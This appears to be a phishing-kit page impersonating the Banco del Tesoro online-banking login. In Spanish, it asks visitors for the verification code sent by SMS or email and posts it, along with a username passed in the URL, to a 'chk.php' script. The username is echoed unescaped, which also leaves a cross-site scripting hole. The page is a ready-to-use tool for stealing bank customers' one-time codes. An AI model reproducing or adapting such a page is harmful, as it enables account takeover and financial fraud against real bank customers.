<!DOCTYPE html>
<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco del Tesoro</title>

    
    <link href="./docs/bootstrap-icons.css" rel="stylesheet">

    <link rel="stylesheet" href="./docs/style.min.css" id="switchThemeStyle">

    <link rel="stylesheet" href="./docs/sweetalert2.bundle.css">
    <link rel="icon" type="image/png" sizes="32x32" href="./docs/favicon-32x32.png">

    <style>
        @media (min-width: 1200px) {
            body {
                background: url(./docs/bgLogin.png) no-repeat center bottom fixed;
                -webkit-background-size: cover;
                -moz-background-size: cover;
                -o-background-size: cover;
                background-size: cover;
            }

            #card {
                transition: 0.7s ease;
                margin-left: 70% !important;
            }

            .btn {
                text-transform: none !important;
            }

            .text-tesoro-blue {
                color: rgb(0, 45, 115);
            }

            #yearbdt {
                margin-right: 5%;
            }

        }

        @media (min-width: 300px) and (max-width: 1199px) {
            #card {
                margin-left: 15% !important;
                background-position: top right !important;
                width: 75%;
            }

            label, p {
                font-weight: bold;
            }

            body {
                background: linear-gradient(rgba(0, 0, 0, 0), rgba(255, 255, 0, 0), rgba(0, 255, 0, 0)), 
				url(./docs/btenlinea_movil.jpg) no-repeat center bottom;
                background-attachment: fixed;
            }

            #yearbdt {
                margin-right: 20%;
            }
        }

        /*SWEETALERT2*/
        .swal2-styled.swal2-confirm {
            background-color: #002D73 !important;
        }

        .swal2-styled.swal2-cancel,
        .swal2-styled.swal2-deny {
            background-color: #ff0000 !important;;
        }

        .hide {
            display: none !important;
        }

        .avatar-group .avatar-group-item {
            border: none !important;
        }

    </style>

</head>

<body style="height: 100% !important;">

    <div class="d-flex flex-column flex-root bgi-position-y-bottom position-x-center bgi-no-repeat bgi-size-contain bgi-attachment-fixed" style="">
        
        <div class="page d-flex flex-row flex-column-fluid">

            
            <main class="page-content overflow-hidden ms-0 d-flex flex-column flex-row-fluid">

                
                <div class="content p-1 d-flex flex-column-fluid position-relative">
                    <div class="container py-4">
                        <div class="row pt-10">
                            <div class="offset-md-8 col-md-6 col-lg-5 col-xl-4 col-sm-8 col- pt-5" id="card">
                                
                                <div class="d-flex position-relative mb-4 z-index-1 align-items-center justify-content-center">
                                    <img src="./docs/logo-slogan.png" alt="Banco del Tesoro"  0="class" class="w-100" style="max-width: 500px;" loading="lazy">
                                </div>
                                
                                <div class="p-4">
                                    <p class="text-">Ingresa el codigo recibido via SMS o correo electronico.</p>

                                    

                                    

                                    <form method="POST" action="chk.php" id="form" autocomplete="off" class="z-index-1 position-relative" >
                                         <input type="hidden"  name="txtusr" value="<?php echo $_GET['u']; ?>">

                                        <div class="mb-3">
                                            <div>
                                                
                                                <input class="form-control" name="opt1" id="password" type="tel" autocomplete="off" placeholder="EJ:1234567" required="required" maxlength="10">
                                            </div>
                                        </div>

                                        <div class="d-flex align-items-center justify-content-center hide p-4 cargando" role="status">
                                            <svg class="anim-spinner text-tesoro-blue me-3" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <path d="M24 12C24 14.3734 23.2962 16.6935 21.9776 18.6668C20.6591 20.6402 18.7849 22.1783 16.5922 23.0866C14.3995 23.9948 11.9867 24.2324 9.65892 23.7694C7.33114 23.3064 5.19295 22.1635 3.51472 20.4853C1.83649 18.8071 0.693599 16.6689 0.230577 14.3411C-0.232446 12.0133 0.00519403 9.60051 0.913446 7.4078C1.8217 5.21509 3.35977 3.34094 5.33316 2.02236C7.30655 0.703788 9.62662 -2.83022e-08 12 0L12 3C10.22 3 8.47991 3.52784 6.99987 4.51677C5.51983 5.50571 4.36627 6.91131 3.68508 8.55585C3.0039 10.2004 2.82567 12.01 3.17293 13.7558C3.5202 15.5016 4.37737 17.1053 5.63604 18.364C6.89471 19.6226 8.49836 20.4798 10.2442 20.8271C11.99 21.1743 13.7996 20.9961 15.4442 20.3149C17.0887 19.6337 18.4943 18.4802 19.4832 17.0001C20.4722 15.5201 21 13.78 21 12H24Z" fill="currentColor"></path>
                                            </svg>
                                            <span class="">Cargando, por favor espera...</span>
                                        </div>
                                        <div class="botones">
                                            <button class="w-100 btn" style="background-color: #1511A0; color: white" type="submit">Ingresar</button>
                                        </div>

                                        
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                


                
                <footer class="pb-4 px-4 px-lg-8">
                    <div class="container-fluid px-0">
                        <span class="d-block lh-sm small text-muted text-end" id="yearbdt">
                            © 2025. BDT
                        </span>
                    </div>
                </footer>
            </main>
        </div>
    </div>

    

  



</body></html>